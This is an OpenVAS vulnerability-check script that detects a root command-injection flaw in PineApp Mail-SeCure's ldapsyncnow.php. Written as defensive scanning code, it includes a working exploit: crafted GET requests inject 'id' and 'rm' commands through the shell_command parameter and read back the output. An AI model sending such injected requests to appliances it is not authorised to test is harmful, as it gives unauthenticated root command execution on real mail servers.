###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_pineapp_mailsecure_61474.nasl 13994 2019-03-05 12:23:37Z cfischer $
#
# PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103758");
  script_bugtraq_id(61474);
  script_version("$Revision: 13994 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_name("PineApp Mail-SeCure 'ldapsyncnow.php' Remote Command Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/61474");

  script_tag(name:"last_modification", value:"$Date: 2019-03-05 13:23:37 +0100 (Tue, 05 Mar 2019) $");
  script_tag(name:"creation_date", value:"2013-08-13 11:34:56 +0200 (Tue, 13 Aug 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 7443);
  script_exclude_keys("Settings/disable_cgi_scanning", "PineApp/missing");

  script_tag(name:"impact", value:"Successful exploits will result in the execution of arbitrary commands
  with root privileges in the context of the affected appliance.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check the response.");

  script_tag(name:"insight", value:"The specific flaw exists with input sanitization in the
  ldapsyncnow.php component. This flaw allows for the injection of arbitrary
  commands to the Mail-SeCure server. An attacker could leverage this
  vulnerability to execute arbitrary code as root.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"PineApp Mail-SeCure is prone to a remote command-injection
  vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:7443);
if(!can_host_php(port:port))
  exit(0);

resp = http_get_cache(item:"/", port:port);

if(! resp || "PineApp" >!< resp) {
  set_kb_item(name:"PineApp/missing", value:TRUE);
  exit(0);
}

vtstrings = get_vt_strings();
file = vtstrings["lowercase_rand"] + '.txt';

vuln_url = "/admin/ldapsyncnow.php?sync_now=1&shell_command=";
req = http_get(item:vuln_url + "id>./" + file + ";", port:port);
resp = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

req = http_get(item:"/admin/" + file, port:port);
resp = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

req = http_get(item:vuln_url + "rm%20./" + file + ";", port:port);
http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

if(resp =~ "uid=[0-9]+.*gid=[0-9]+.*") {
  report = report_vuln_url(port:port, url:vuln_url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);